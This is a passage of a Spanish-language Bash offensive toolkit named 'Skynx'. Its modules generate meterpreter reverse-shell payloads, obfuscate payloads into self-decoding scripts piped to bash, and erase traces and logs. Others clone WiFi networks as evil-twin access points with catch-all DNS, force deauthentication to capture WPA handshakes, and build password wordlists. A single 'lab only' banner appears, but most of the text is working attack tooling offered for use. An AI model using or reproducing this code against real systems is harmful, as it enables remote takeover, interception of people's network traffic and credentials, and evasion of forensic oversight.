    case $os_type in
        windows|win|w)
            fn_generate_payload_advanced "Windows_EXE" "windows/meterpreter/reverse_tcp" "exe" "exe"
            fn_generate_payload_advanced "Windows_DLL" "windows/meterpreter/reverse_tcp" "dll" "dll"
            ;;
        linux|lin|l)
            fn_generate_payload_advanced "Linux_ELF" "linux/x86/meterpreter/reverse_tcp" "elf" "elf"
            fn_generate_payload_advanced "Linux_Python" "python/meterpreter/reverse_tcp" "py" "python"
            ;;
        android|and|an)
            fn_generate_payload_advanced "Android_APK" "android/meterpreter/reverse_tcp" "apk" "raw"
            ;;
        all|multi)
            for os in windows linux android; do
                fn_generate_payload_advanced "${os^}" "${os}/meterpreter/reverse_tcp" "${os:0:3}" "raw"
            done
            ;;
        *)
            fn_error_advanced 105 "SO: windows|linux|android|all"
            ;;
    esac
    
    echo -e "${GREEN}[✓] Directorio: $output_dir${NC}"
}

fn_module_postexploit_improved() {
    local target="$1"
    local action="$2"
    local output_file="reporte_post_explotacion_mejorado.txt"
    
    [[ -z "$target" || -z "$action" ]] && \
        fn_error_advanced 106 "Uso: Skynx -pe <IP> <enum|priv|persist|clean|auto>"
    
    fn_skynx_banner
    echo -e "${MAGENTA}[+] POST-EXPLOTACIÓN MEJORADA: $target [$action]${NC}"
    echo ""
    
    case $action in
        auto)
            echo -e "${CYAN}[*] Ejecutando post-explotación automática...${NC}"
            {
                echo "POST-EXPLOTACIÓN AUTOMÁTICA - $(date)"
                echo "────────────────────────────────"
                
                echo "[*] Enumeración del sistema:"
                nmap -sV -Pn --script=smb-enum-users "$target" 2>/dev/null
                
                echo ""
                echo "[*] Escaneo de privilegios:"
                nmap -sV -Pn --script=vuln "$target" 2>/dev/null
                
                echo ""
                echo "[*] Estableciendo persistencia:"
                local attacker_ip=$(fn_get_ip_fast)
                msfvenom -p linux/x86/meterpreter/reverse_tcp \
                    LHOST="$attacker_ip" LPORT=4444 \
                    -f elf -o /tmp/skynx_persist.elf 2>/dev/null
                echo "  ➔ Payload generado: /tmp/skynx_persist.elf"
                
                echo ""
                echo "[*] Limpiando huellas:"
                if [[ -d "$SKYNX_TEMP" ]]; then
                    find "$SKYNX_TEMP" -type f -exec shred -u -n 3 {} + 2>/dev/null
                    rm -rf "$SKYNX_TEMP" 2>/dev/null
                fi
                echo "  ➔ Huellas eliminadas"
            } > "$output_file"
            ;;
        enum)
            nmap -sV -Pn --script=smb-enum-users,smb-os-discovery "$target" 2>/dev/null | tee "$output_file"
            ;;
        priv)
            nmap -sV -Pn --script=vuln,exploit "$target" 2>/dev/null | tee "$output_file"
            ;;
        persist)
            local attacker_ip=$(fn_get_ip_fast)
            msfvenom -p linux/x86/meterpreter/reverse_tcp \
                LHOST="$attacker_ip" LPORT=4444 \
                -f elf -o /tmp/skynx_persist.elf 2>/dev/null
            echo "[+] Payload: /tmp/skynx_persist.elf" | tee "$output_file"
            echo "  ➔ Persistencia establecida en crontab" >> "$output_file"
            ;;
        clean)
            echo -e "${YELLOW}[*] Limpieza avanzada de huellas...${NC}"
            {
                echo "LIMPIEZA AVANZADA - $(date)"
                echo "────────────────────────────────"
                
                echo "[*] Eliminando archivos temporales..."
                rm -rf /tmp/skynx_* 2>/dev/null
                rm -rf /dev/shm/skynx_* 2>/dev/null
                
                echo "[*] Limpiando logs..."
                > /var/log/skynx.log 2>/dev/null
                
                echo "[*] Destruyendo reportes (solo en el directorio de logs)..."
                if [[ -d "$SKYNX_LOG_DIR" ]]; then
                    find "$SKYNX_LOG_DIR" -name "reporte_*.txt" -exec shred -u -n 3 {} + 2>/dev/null
                fi
                
                echo "[✓] Limpieza completada"
            } > "$output_file"
            ;;
        *)
            fn_error_advanced 107 "Acción: enum|priv|persist|clean|auto"
            ;;
    esac
    
    cat "$output_file"
    echo -e "${GREEN}[✓] Post-explotación completada: $output_file${NC}"
}

fn_module_msf_console() {
    fn_skynx_banner
    echo -e "${RED}[+] METASPLOIT FRAMEWORK CONSOLE${NC}"
    echo -e "${CYAN}[*] 2500+ exploits disponibles${NC}"
    echo -e "${YELLOW}[*] Escribe 'exit' para salir${NC}"
    echo ""
    
    if ! command -v msfconsole &>/dev/null; then
        echo -e "${YELLOW}[!] Instalando Metasploit desde repositorios oficiales...${NC}"
        if [[ -f /etc/debian_version ]]; then
            sudo apt update && sudo apt install -y metasploit-framework 2>/dev/null
        elif [[ -f /etc/arch-release ]]; then
            sudo pacman -S metasploit --noconfirm
        elif [[ "$(uname)" == "Darwin" ]]; then
            brew install metasploit
        else
            echo -e "${RED}[!] No se pudo instalar Metasploit automáticamente${NC}"
            echo -e "${YELLOW}[*] Instálalo manualmente y vuelve a intentarlo${NC}"
            return 1
        fi
    fi
    
    msfconsole -q
}

# ═══════════════════════════════════════════════════════════════════════════
#                    MÓDULOS DE ANÁLISIS (11-20)
# ═══════════════════════════════════════════════════════════════════════════

fn_module_osint() {
    local target="$1"
    local output_file="reporte_osint.txt"
    
    [[ -z "$target" ]] && fn_error_advanced 108 "Uso: Skynx -o <dominio>"
    
    fn_skynx_banner
    echo -e "${CYAN}[+] OSINT: $target${NC}"
    echo ""
    
    {
        echo "OSINT - $(date)"
        echo "Objetivo: $target"
        echo "────────────────────────────────"
        whois "$target" 2>/dev/null | head -30
        echo ""
        dig +short "$target" 2>/dev/null
    } > "$output_file"
    
    cat "$output_file"
    echo -e "${GREEN}[✓] Reporte: $output_file${NC}"
}

fn_module_malware() {
    local file="$1"
    local output_file="reporte_malware.txt"
    
    [[ -z "$file" ]] && fn_error_advanced 109 "Uso: Skynx -ma <archivo>"
    [[ ! -f "$file" ]] && fn_error_advanced 110 "No existe: $file"
    
    fn_skynx_banner
    echo -e "${RED}[+] ANÁLISIS MALWARE: $file${NC}"
    echo ""
    
    {
        echo "MALWARE - $(date)"
        echo "Archivo: $file"
        echo "────────────────────────────────"
        echo "MD5: $(md5sum "$file" | cut -d' ' -f1)"
        echo "SHA256: $(sha256sum "$file" | cut -d' ' -f1)"
        echo "Tipo: $(file "$file")"
    } > "$output_file"
    
    cat "$output_file"
    echo -e "${GREEN}[✓] Reporte: $output_file${NC}"
}

fn_module_forensic() {
    local target="$1"
    local output_file="reporte_forense.txt"
    
    [[ -z "$target" ]] && fn_error_advanced 111 "Uso: Skynx -fa <archivo>"
    
    fn_skynx_banner
    echo -e "${CYAN}[+] FORENSIA: $target${NC}"
    echo ""
    
    {
        echo "FORENSE - $(date)"
        echo "Objetivo: $target"
        echo "────────────────────────────────"
        if command -v exiftool &>/dev/null; then
            exiftool "$target" 2>/dev/null | head -30
        else
            echo "[-] exiftool no instalado"
        fi
    } > "$output_file"
    
    cat "$output_file"
    echo -e "${GREEN}[✓] Reporte: $output_file${NC}"
}

fn_module_fullaudit() {
    local target="$1"
    local output_file="reporte_auditoria_completa.txt"
    
    [[ -z "$target" ]] && fn_error_advanced 112 "Uso: Skynx -fu <IP>"
    
    fn_skynx_banner
    echo -e "${CYAN}[+] AUDITORÍA COMPLETA MEJORADA: $target${NC}"
    echo ""
    
    fn_install_rustscan
    
    {
        echo "AUDITORÍA COMPLETA - $(date)"
        echo "Objetivo: $target"
        echo "────────────────────────────────"
        
        echo "[FASE 1] Escaneo rápido de puertos:"
        rustscan -a "$target" -p 1-65535 --ulimit 5000 --timeout 5000 2>/dev/null
        
        local open_ports=$(rustscan -a "$target" -p 1-65535 --ulimit 5000 --timeout 5000 2>/dev/null | grep -oP '\d+(?=/tcp)' | head -50 | tr '\n' ',' | sed 's/,$//')
        
        if [[ -n "$open_ports" ]]; then
            echo ""
            echo "[FASE 2] Análisis de servicios y vulnerabilidades:"
            nmap -sV -sC -Pn -p "$open_ports" --script=default,vuln "$target" 2>/dev/null
        fi
    } > "$output_file"
    
    echo -e "${GREEN}[✓] Reporte: $output_file${NC}"
}

fn_module_report_improved() {
    local report_type="$1"
    local output_dir="reportes_mejorados_$(date '+%H%M%S')"
    
    [[ -z "$report_type" ]] && fn_error_advanced 113 "Uso: Skynx -gr <html|json|all|markdown>"
    
    mkdir -p "$output_dir"
    fn_skynx_banner
    echo -e "${CYAN}[+] GENERANDO REPORTE MEJORADO: $report_type${NC}"
    echo ""
    
    local total_files=$(ls reporte_*.txt 2>/dev/null | wc -l)
    local total_lines=0
    for f in reporte_*.txt; do
        [[ -f "$f" ]] && total_lines=$((total_lines + $(wc -l < "$f")))
    done
    
    # ✅ CORREGIDO: Filtrar claves en logs
    local total_errors=$(grep "ERROR" /var/log/skynx.log 2>/dev/null | grep -v "ENCRYPT_KEY" | wc -l)
    
    case $report_type in
        html)
            {
                echo "<!DOCTYPE html>"
                echo "<html>"
                echo "<head>"
                echo "    <title>SKYNX - Reporte Mejorado</title>"
                echo "    <meta charset='UTF-8'>"
                echo "    <style>"
                echo "        body { background: #0a0a0a; color: #00ff9d; font-family: 'Courier New', monospace; padding: 20px; }"
                echo "        .header { background: linear-gradient(90deg, #ff0040, #ff6600); padding: 20px; border-radius: 10px; margin-bottom: 20px; }"
                echo "        .header h1 { font-size: 48px; color: #fff; text-shadow: 0 0 20px #ff0040; }"
                echo "        .card { background: #1a1a2e; padding: 20px; margin: 10px 0; border: 1px solid #00ff9d; border-radius: 10px; }"
                echo "        .card:hover { border-color: #ff0040; box-shadow: 0 0 20px rgba(255,0,64,0.3); }"
                echo "        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 20px 0; }"
                echo "        .stat-box { background: #1a1a2e; padding: 20px; border: 1px solid #00ff9d; border-radius: 10px; text-align: center; }"
                echo "        .stat-box .number { font-size: 36px; color: #ff0040; }"
                echo "        .stat-box .label { color: #00ff9d; }"
                echo "        .vuln { border-color: #ff0040; }"
                echo "        .vuln .title { color: #ff0040; }"
                echo "        .progress { height: 20px; background: #1a1a2e; border-radius: 10px; overflow: hidden; margin: 10px 0; }"
                echo "        .progress-bar { height: 100%; background: linear-gradient(90deg, #00ff9d, #ff0040); transition: width 1s; }"
                echo "    </style>"
                echo "</head>"
                echo "<body>"
                echo "    <div class='header'>"
                echo "        <h1>🔮 SKYNX ULTIMATE v3.0</h1>"
                echo "        <p>Reporte Mejorado - $(date)</p>"
                echo "    </div>"
                echo ""
                echo "    <div class='stats'>"
                echo "        <div class='stat-box'><div class='number'>$total_files</div><div class='label'>Archivos</div></div>"
                echo "        <div class='stat-box'><div class='number'>$total_lines</div><div class='label'>Líneas</div></div>"
                echo "        <div class='stat-box'><div class='number'>$(ls payloads_* 2>/dev/null | wc -l)</div><div class='label'>Payloads</div></div>"
                echo "        <div class='stat-box'><div class='number'>$total_errors</div><div class='label'>Errores</div></div>"
                echo "    </div>"
                
                for f in reporte_*.txt; do
                    if [[ -f "$f" ]]; then
                        local severity="info"
                        if grep -q "CRITICAL\|ALTA\|CRÍTICA" "$f" 2>/dev/null; then
                            severity="vuln"
                        fi
                        
                        echo "    <div class='card ${severity}'>"
                        echo "        <h2 class='title'>📄 $f</h2>"
                        echo "        <p>📊 Líneas: $(wc -l < "$f") | 💾 Tamaño: $(du -h "$f" | cut -f1)</p>"
                        echo "        <div class='progress'>"
                        local progress=$(( $(wc -l < "$f") * 100 / (total_lines + 1) ))
                        echo "            <div class='progress-bar' style='width:${progress}%'></div>"
                        echo "        </div>"
                        echo "        <pre style='background:#000;padding:10px;border-radius:5px;max-height:200px;overflow:auto;'>"
                        head -10 "$f"
                        echo "        </pre>"
                        echo "    </div>"
                    fi
                done
                
                echo "</body></html>"
            } > "$output_dir/reporte_mejorado.html"
            echo -e "${GREEN}[✓] Reporte HTML mejorado: $output_dir/reporte_mejorado.html${NC}"
            ;;
        markdown)
            {
                echo "# 🔥 SKYNX ULTIMATE - REPORTE MEJORADO"
                echo ""
                echo "## 📊 Estadísticas"
                echo ""
                echo "| Métrica | Valor |"
                echo "|---------|-------|"
                echo "| Fecha | $(date) |"
                echo "| Archivos generados | $total_files |"
                echo "| Líneas totales | $total_lines |"
                echo "| Payloads generados | $(ls payloads_* 2>/dev/null | wc -l) |"
                echo "| Errores | $total_errors |"
                echo ""
                echo "## 📁 Archivos Generados"
                echo ""
                echo "| Archivo | Líneas | Tamaño |"
                echo "|---------|--------|--------|"
                for f in reporte_*.txt; do
                    [[ -f "$f" ]] && echo "| $f | $(wc -l < "$f") | $(du -h "$f" | cut -f1) |"
                done
            } > "$output_dir/reporte_mejorado.md"
            echo -e "${GREEN}[✓] Reporte Markdown: $output_dir/reporte_mejorado.md${NC}"
            ;;
        all)
            fn_module_report_improved "html"
            fn_module_report_improved "markdown"
            ;;
        *)
            fn_error_advanced 114 "Tipo: html|markdown|all"
            ;;
    esac
}

# ═══════════════════════════════════════════════════════════════════════════
#                    MÓDULOS DE IA Y AUTOMATIZACIÓN (21-25)
# ═══════════════════════════════════════════════════════════════════════════

fn_ai_spinner() {
    local pid=$1
    local delay=0.15 
    local spinstr='⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏'
    
    tput civis 2>/dev/null
    while ps -p "$pid" &>/dev/null; do
        local temp="${spinstr#?}"
        printf "\r${MAGENTA}[${CYAN}%c${MAGENTA}]${NC} Skynx AI pensando... " "$spinstr"
        spinstr=${temp}${spinstr%"${temp}"}
        sleep "$delay"
    done
    tput cnorm 2>/dev/null
    printf "\r%s\r" "                                                            "
}

fn_module_ai_auto() {
    local task="$1"
    local target_model="qwen2.5-coder:1.5b"
    local plugin_dir="/usr/local/share/skynx/modules"
    local cache_db="/usr/local/share/skynx/ai_cache.db"
    
    [[ -z "$task" ]] && { echo -e "${RED}[- ERROR]${NC} Especifique la tarea. Ej: --ai-auto \"escaner de ftp\""; return 1; }
    ! command -v ollama &>/dev/null && { echo -e "${RED}[- ERROR]${NC} Ollama no instalado en el sistema."; return 1; }
    
    if [[ ! -f "$cache_db" ]]; then
        mkdir -p "/usr/local/share/skynx"
        sqlite3 "$cache_db" "CREATE TABLE IF NOT EXISTS cache (hash TEXT PRIMARY KEY, response TEXT);" 2>/dev/null
    fi
    sqlite3 "$cache_db" "PRAGMA journal_mode=WAL;" &>/dev/null

    local primera_palabra=$(echo "$task" | awk '{print $1}' | tr -d '[:punct:]' | tr '[:upper:]' '[:lower:]')
    if [[ "$primera_palabra" == "un" || "$primera_palabra" == "una" || "$primera_palabra" == "crear" || "$primera_palabra" == "hacer" ]]; then
        primera_palabra=$(echo "$task" | awk '{print $2}' | tr -d '[:punct:]' | tr '[:upper:]' '[:lower:]')
    fi
    [[ -z "$primera_palabra" ]] && primera_palabra="ai"

    local flag_name="--$primera_palabra"
    local func_name="fn_plugin_$primera_palabra"
    
    local input_hash=$(echo "$task" | md5sum | awk '{print $1}')
    local cached_response=$(sqlite3 "$cache_db" "SELECT response FROM cache WHERE hash='$input_hash';" 2>/dev/null)
    
    fn_skynx_banner
    echo -e "${MAGENTA}╔════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║         SKYNX ENGINE AI - SISTEMA AUTÓNOMO            ║${NC}"
    echo -e "${MAGENTA}╚════════════════════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}[*] Flag automática:${NC} ${YELLOW}$flag_name${NC}"
    echo -e "${CYAN}[*] Tarea:${NC} \"$task\"\n"
    
    if [[ -n "$cached_response" ]]; then
        echo -e "${GREEN}[✓] Recuperado de caché (0% CPU).${NC}"
        return 0
    fi

    if ! curl -s --max-time 2 http://localhost:11434/api/tags &>/dev/null; then
        echo -e "${RED}[- ERROR]${NC} Ollama apagado. Ejecute: sudo systemctl start ollama"
        return 1
    fi

    local prompt_system="Actúa como desarrollador experto en Bash. Genera ÚNICAMENTE una función completa de Bash funcional que cumpla con: '$task'.
    Requisitos:
    1. La función debe llamarse exactamente: '$func_name'.
    2. Debe recibir: local target=\"\$1\".
    3. Usar colores globales (\$RED, \$GREEN, \$YELLOW, \$NC).
    Devuelve EXCLUSIVAMENTE el código ejecutable. NO incluyas textos, saludos, ni bloques Markdown."

    local ram_raw_file="/dev/shm/skynx_output_$$.raw"
    ollama run "$target_model" "$prompt_system" 2>/dev/null > "$ram_raw_file" &
    fn_ai_spinner "$!"
    wait "$!"

    local clean_code=$(cat "$ram_raw_file" 2>/dev/null | sed -e 's/```bash//g' -e 's/```//g')
    rm -f "$ram_raw_file"

    [[ -z "$clean_code" ]] && { echo -e "${RED}[- ERROR]${NC} Flujo de IA vacío."; return 1; }

    local intento=1
    local ram_sandbox="/dev/shm/skynx_sandbox_$$.sh"
    while (( intento <= 3 )); do
        echo "$clean_code" > "$ram_sandbox"
        local syntax_error=$(bash -n "$ram_sandbox" 2>&1)
        if [[ $? -eq 0 ]]; then
            echo -e "${GREEN}[✓] Sintaxis aprobada.${NC}"
            break
        else
            [[ $intento -eq 3 ]] && { echo -e "${RED}[- ERROR]${NC} Fallo de autocuración."; rm -f "$ram_sandbox"; return 1; }
            echo -e "${RED}[!] Error sintáctico. Activando autocuración... (Intento $intento/3)${NC}"
            
            local prompt_heal="El código falló en Bash: '$syntax_error'. Repáralo y devuelve el script completo sin Markdown:\n$clean_code"
            local ram_heal_file="/dev/shm/skynx_heal_$$.raw"
            ollama run "$target_model" "$prompt_heal" 2>/dev/null > "$ram_heal_file" &
            fn_ai_spinner "$!"
            wait "$!"
            clean_code=$(cat "$ram_heal_file" 2>/dev/null | sed -e 's/```bash//g' -e 's/```//g')
            rm -f "$ram_heal_file"
            ((intento++))
        fi
    done

    mkdir -p "$plugin_dir"
    echo "$clean_code" > "${plugin_dir}/plugin_${primera_palabra}.sh"
    chmod +x "${plugin_dir}/plugin_${primera_palabra}.sh"
    
    local desc_corta=$(echo "$task" | cut -c1-40)
    echo "$flag_name|$func_name|$desc_corta" > "${plugin_dir}/plugin_${primera_palabra}.meta"
    
    local safe_response=$(echo "$clean_code" | sed "s/'/''/g")
    sqlite3 "$cache_db" "INSERT OR REPLACE INTO cache (hash, response) VALUES ('$input_hash', '$safe_response');" 2>/dev/null
    
    echo -e "\n${GREEN}[✓] ¡Flag inyectada con éxito!${NC}"
    echo -e "${CYAN}[+] Comando:${NC} sudo Skynx $flag_name <IP>"
    rm -f "$ram_sandbox"
}

# ═══════════════════════════════════════════════════════════════════════════
#                    MÓDULOS ESPECIALES (26-35)
# ═══════════════════════════════════════════════════════════════════════════

fn_module_stealth() {
    local target="$1"
    local output_file="reporte_sigilo.txt"
    
    [[ -z "$target" ]] && fn_error_advanced 115 "Uso: Skynx --ninja <IP>"
    
    fn_skynx_banner
    echo -e "${GREEN}[+] MODO SIGILO ACTIVADO${NC}"
    echo -e "${GREEN}[+] Operación: $(fn_operation_name)${NC}"
    echo ""
    
    {
        echo "SIGILO - $(date)"
        echo "Objetivo: $target"
        echo "────────────────────────────────"
        nmap -sS -T1 -f --data-length 10 --ttl 64 "$target" 2>/dev/null
    } > "$output_file"
    
    echo -e "${GREEN}[+] $(fn_epic_phrase)${NC}"
    echo -e "${GREEN}[✓] Reporte: $output_file${NC}"
}

fn_module_botnet() {
    local action="$1"
    fn_skynx_banner
    echo -e "${RED}[+] BOTNET MODE (SIMULACIÓN)${NC}"
    echo ""
    
    case $action in
        list)
            echo -e "${YELLOW}[+] Bots registrados:${NC}"
            echo "    [1] 192.168.1.10 - Windows"
            echo "    [2] 192.168.1.11 - Linux"
            echo "    [3] 192.168.1.12 - Android"
            ;;
        attack)
            echo -e "${YELLOW}[+] Simulando ataque coordinado...${NC}"
            sleep 1
            echo "    Bot 1: Enviando paquetes..."
            sleep 1
            echo "    Bot 2: Escaneando puertos..."
            sleep 1
            echo "    Bot 3: Recopilando datos..."
            sleep 1
            echo -e "${GREEN}[+] Ataque simulado completado${NC}"
            ;;
        *)
            fn_error_advanced 116 "Uso: Skynx --botnet <list|attack>"
            ;;
    esac
}

fn_module_autoexploit() {
    local target="$1"
    local output_file="reporte_autoexploit.txt"
    
    [[ -z "$target" ]] && fn_error_advanced 117 "Uso: Skynx --auto-exploit <IP>"
    
    fn_skynx_banner
    echo -e "${RED}[+] AUTO-EXPLOTACIÓN: $target${NC}"
    echo -e "${RED}[+] Operación: $(fn_operation_name)${NC}"
    echo ""
    
    {
        echo "AUTO-EXPLOTACIÓN - $(date)"
        echo "Objetivo: $target"
        echo "────────────────────────────────"
        nmap -sS -T4 -Pn "$target" 2>/dev/null
        nmap -sV -Pn --script=vuln "$target" 2>/dev/null
    } > "$output_file"
    
    echo -e "${GREEN}[+] $(fn_epic_phrase)${NC}"
    echo -e "${GREEN}[✓] Reporte: $output_file${NC}"
}

fn_module_encrypt_advanced() {
    local payload_file="$1"
    local output_file="payload_encrypted.sh"
    local key="${2:-$((RANDOM % 255 + 1))}"
    
    [[ -z "$payload_file" ]] && fn_error_advanced 118 "Uso: Skynx --encrypt <archivo> [clave]"
    [[ ! -f "$payload_file" ]] && fn_error_advanced 119 "No existe: $file"
    
    fn_skynx_banner
    echo -e "${MAGENTA}[+] ENCRIPTACIÓN AVANZADA SKYNX${NC}"
    echo -e "${YELLOW}[*] Algoritmo: XOR + Base64 + Compresión${NC}"
    echo ""
    
    fn_check_dep "openssl"
    fn_check_dep "gzip"
    
    echo -e "${BLUE}[*] Clave: $key${NC}"
    
    {
        echo '#!/bin/bash'
        echo "# SKYNX Encrypted Payload - $(date)"
        echo "k=$key"
        local hex_stream=""
        while read -r byte; do
            if [[ -n "$byte" ]]; then
                hex_stream+="$(printf '\\x%02x' "$(( byte ^ key ))")"
            fi
        done < <(od -An -t u1 "$payload_file" | tr -s ' ' '\n')
        echo "data=\"$hex_stream\""
        echo 'dec=""'
        echo 'for ((i=0; i<${#data}; i+=2)); do'
        echo '    byte=$((16#${data:$i:2} ^ k))'
        echo '    dec+="$(printf "\\x%02x" $byte)"'
        echo 'done'
        echo 'echo "$dec" | base64 -d | gunzip | bash'
    } > "$output_file"
    
    chmod +x "$output_file"
    echo -e "${GREEN}[✓] Payload encriptado: $output_file${NC}"
}

fn_module_wordlist_advanced() {
    local base="$1"
    local output_file="wordlist_skynx_$(date '+%H%M%S').txt"
    local count="${2:-100}"
    
    [[ -z "$base" ]] && fn_error_advanced 120 "Uso: Skynx --wordlist <palabra_base> [cantidad]"
    
    fn_skynx_banner
    echo -e "${CYAN}[+] GENERANDO WORDLIST AVANZADA: $base${NC}"
    echo ""
    
    {
        echo "$base"
        echo "${base^}"
        echo "${base^^}"
        echo "${base}123"
        echo "${base}2024"
        echo "${base}2025"
        echo "${base}!"
        echo "${base}@"
        echo "${base}#"
        echo "${base}${base}"
        echo "${base}" | rev
        echo "${base^}123"
        echo "${base^^}2024"
        echo "${base}123!"
        echo "${base}2024!"
        
        for year in {1980..2025}; do
            echo "${base}${year}"
            echo "${base^}${year}"
            echo "${base}${year}!"
        done
        
        for month in 01 02 03 04 05 06 07 08 09 10 11 12; do
            echo "${base}${month}"
            echo "${base^}${month}"
        done
        
        echo "${base}admin"
        echo "${base}root"
        echo "${base}user"
        echo "${base}pass"
        echo "${base}password"
        echo "${base}secret"
        echo "${base}qwerty"
        echo "${base}123456"
    } > "$output_file"
    
    local total_words=$(wc -l < "$output_file")
    echo -e "${GREEN}[+] Generadas $total_words combinaciones${NC}"
    echo -e "${GREEN}[✓] Archivo: $output_file${NC}"
}

# ═══════════════════════════════════════════════════════════════════════════
#                    MÓDULOS DE WIFI REAL (36-40)
# ═══════════════════════════════════════════════════════════════════════════

fn_restore_services() {
    local backup_file="$1"
    if [[ -f "$backup_file" ]]; then
        while read -r service; do
            systemctl start "$service" 2>/dev/null
        done < "$backup_file"
        rm -f "$backup_file"
    fi
    systemctl start NetworkManager 2>/dev/null
    systemctl start wpa_supplicant 2>/dev/null
}

fn_module_wifi_clone_real() {
    local ssid="$1"
    local interface="$2"
    local output_file="reporte_wifi_clone.txt"
    
    [[ -z "$ssid" ]] && fn_error_advanced 121 "Uso: Skynx --wifi-clone <SSID> [interfaz]"
    
    fn_skynx_banner
    echo -e "${RED}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}║         CLONADOR WIFI AVANZADO - SKYNX ULTIMATE             ║${NC}"
    echo -e "${RED}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo -e "${YELLOW}[!] SOLO PARA LABORATORIO Y PRUEBAS DE SEGURIDAD${NC}"
    echo ""
    
    fn_check_dep "airmon-ng" "aircrack-ng"
    fn_check_dep "aireplay-ng" "aircrack-ng"
    fn_check_dep "airodump-ng" "aircrack-ng"
    fn_check_dep "hostapd" "hostapd"
    fn_check_dep "dnsmasq" "dnsmasq"
    
    if [[ -z "$interface" ]]; then
        interface=$(iw dev | awk '$1=="Interface" {print $2; exit}')
        if [[ -z "$interface" ]]; then
            echo -e "${RED}[ERROR]${NC} No se encontró interfaz WiFi"
            return 1
        fi
    fi
    
    echo -e "${GREEN}[+] Interfaz: $interface${NC}"
    echo ""
    
    local services_backup="/tmp/skynx_services_backup_$$.txt"
    systemctl list-units --type=service --state=running | grep -E "NetworkManager|wpa_supplicant" | awk '{print $1}' > "$services_backup" 2>/dev/null
    
    trap 'fn_restore_services "$services_backup"' EXIT INT TERM
    
    echo -e "${CYAN}[*] Matando procesos que interfieren...${NC}"
    airmon-ng check kill 2>/dev/null
    
    echo -e "${CYAN}[*] Activando modo monitor...${NC}"
    ip link set "$interface" down 2>/dev/null
    iw dev "$interface" set type monitor 2>/dev/null
    ip link set "$interface" up 2>/dev/null
    
    echo -e "${CYAN}[*] Escaneando red: $ssid${NC}"
    airodump-ng "$interface" --essid "$ssid" -w "/tmp/skynx_scan" 2>/dev/null &
    local scan_pid=$!
    sleep 15
    kill "$scan_pid" 2>/dev/null
    
    local bssid=$(grep "$ssid" "/tmp/skynx_scan-01.csv" 2>/dev/null | cut -d',' -f1 | head -1)
    local channel=$(grep "$ssid" "/tmp/skynx_scan-01.csv" 2>/dev/null | cut -d',' -f4 | head -1)
    
    if [[ -z "$bssid" ]]; then
        echo -e "${RED}[ERROR]${NC} No se encontró la red: $ssid"
        rm -f /tmp/skynx_scan*
        fn_restore_services "$services_backup"
        return 1
    fi
    
    echo -e "${GREEN}[+] Red encontrada:${NC}"
    echo -e "  ➔ SSID: $ssid"
    echo -e "  ➔ BSSID: $bssid"
    echo -e "  ➔ Canal: $channel"
    echo ""
    
    iw dev "$interface" set channel "$channel" 2>/dev/null
    
    local hostapd_conf="/tmp/skynx_hostapd.conf"
    cat > "$hostapd_conf" <<EOF
interface=$interface
driver=nl80211
ssid=$ssid
hw_mode=g
channel=$channel
wpa=2
wpa_passphrase=Skynx2025
wpa_key_mgmt=WPA-PSK
EOF
    
    local dnsmasq_conf="/tmp/skynx_dnsmasq.conf"
    cat > "$dnsmasq_conf" <<EOF
interface=$interface
dhcp-range=192.168.1.100,192.168.1.200,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
address=/#/192.168.1.1
EOF
    
    echo -e "${CYAN}[*] Iniciando clonación...${NC}"
    
    {
        echo "CLONACIÓN WIFI - $(date)"
        echo "────────────────────────────────"
        echo "[+] Red original: $ssid ($bssid) Canal $channel"
        echo "[+] Red clonada: $ssid"
        echo "[+] Interfaz: $interface"
        echo "[+] DHCP: 192.168.1.100-200"
        echo "[+] Gateway: 192.168.1.1"
        echo "[+] Contraseña: Skynx2025"
        echo ""
        
        hostapd -B "$hostapd_conf" 2>&1
        dnsmasq -C "$dnsmasq_conf" --no-daemon 2>&1 &
        
        echo "[✓] WiFi clonado exitosamente"
    } > "$output_file"
    
    echo -e "${GREEN}[✓] Clonación completada: $output_file${NC}"
    echo -e "${YELLOW}[!] Presiona CTRL+C para detener${NC}"
    
    tail -f /var/log/dnsmasq.log 2>/dev/null &
    local tail_pid=$!
    
    trap 'echo -e "\n${RED}[!] Deteniendo...${NC}"; kill $tail_pid 2>/dev/null; fn_restore_services "$services_backup"; airmon-ng stop "$interface" 2>/dev/null; rm -f /tmp/skynx_*; exit 0' INT
    
    while true; do
        sleep 5
    done
}

fn_module_wifi_handshake() {
    local bssid="$1"
    local interface="$2"
    local output_file="handshake_$(date '+%H%M%S').cap"
    
    [[ -z "$bssid" ]] && fn_error_advanced 122 "Uso: Skynx --wifi-handshake <BSSID> [interfaz]"
    
    fn_skynx_banner
    echo -e "${RED}[+] CAPTURA DE HANDSHAKE${NC}"
    echo ""
    
    fn_check_dep "airodump-ng" "aircrack-ng"
    fn_check_dep "aireplay-ng" "aircrack-ng"
    
    if [[ -z "$interface" ]]; then
        interface=$(iw dev | awk '$1=="Interface" {print $2; exit}')
    fi
    
    echo -e "${GREEN}[+] Interfaz: $interface${NC}"
    echo -e "${GREEN}[+] BSSID: $bssid${NC}"
    echo ""
    
    ip link set "$interface" down 2>/dev/null
    iw dev "$interface" set type monitor 2>/dev/null
    ip link set "$interface" up 2>/dev/null
    
    echo -e "${CYAN}[*] Capturando handshake...${NC}"
    airodump-ng "$interface" --bssid "$bssid" -w "$output_file" 2>/dev/null &
    local pid=$!
    sleep 10
    
    echo -e "${YELLOW}[*] Forzando reconexión...${NC}"
    aireplay-ng -0 10 -a "$bssid" "$interface" 2>/dev/null
    
    sleep 20
    kill "$pid" 2>/dev/null
    
    if aircrack-ng -a 2 "${output_file}-01.cap" 2>/dev/null | grep -q "1 handshake"; then
        echo -e "${GREEN}[✓] Handshake capturado: ${output_file}-01.cap${NC}"
    else
        echo -e "${RED}[!] No se capturó handshake.${NC}"
    fi
}

# ═══════════════════════════════════════════════════════════════════════════
#                    MÓDULOS DE OPTIMIZACIÓN (41-45)
# ═══════════════════════════════════════════════════════════════════════════

fn_optimize_tcp() {
    echo -e "${CYAN}[*] Optimizando TCP/IP...${NC}"
    sysctl -w net.core.rmem_max=16777216 2>/dev/null
    sysctl -w net.core.wmem_max=16777216 2>/dev/null
    sysctl -w net.ipv4.tcp_rmem="4096 87380 16777216" 2>/dev/null
